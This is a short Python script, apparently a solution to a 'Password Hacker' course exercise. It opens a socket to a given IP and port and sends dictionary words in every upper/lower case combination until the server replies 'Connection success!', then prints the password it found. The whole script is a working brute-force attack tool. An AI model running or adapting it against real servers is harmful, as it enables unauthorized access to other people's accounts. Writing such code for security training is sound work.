import argparse
import socket
import itertools

def from_file(file_name):
    with open(file_name) as pwd_file:
        for word in pwd_file:
            for pwd in itertools.product(*zip(word.strip().lower(), word.strip().upper())):
                yield ''.join(pwd)

def main():
    parser = argparse.ArgumentParser(description='Connects to the given IP address.')
    parser.add_argument('ip', metavar='ip', type=str, help='server IP')
    parser.add_argument('port', metavar='port', type=int, help='port')
    args = parser.parse_args()

    passwords = from_file(
        '/Users/marcinkarpik/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt')

    with socket.socket() as client_socket:
        address = (args.ip, args.port)
        client_socket.connect(address)
        response = "Wrong password!"
        while response != 'Connection success!':
            try:
                passw = next(passwords)
                data = passw.encode(encoding='UTF-8')
                client_socket.send(data)
                response = client_socket.recv(1024)
                response = response.decode(encoding='UTF-8')
            except:
                print("End of dictionary")
                break

        if response == 'Connection success!':
            print(passw)


if __name__ == "__main__":
    main()
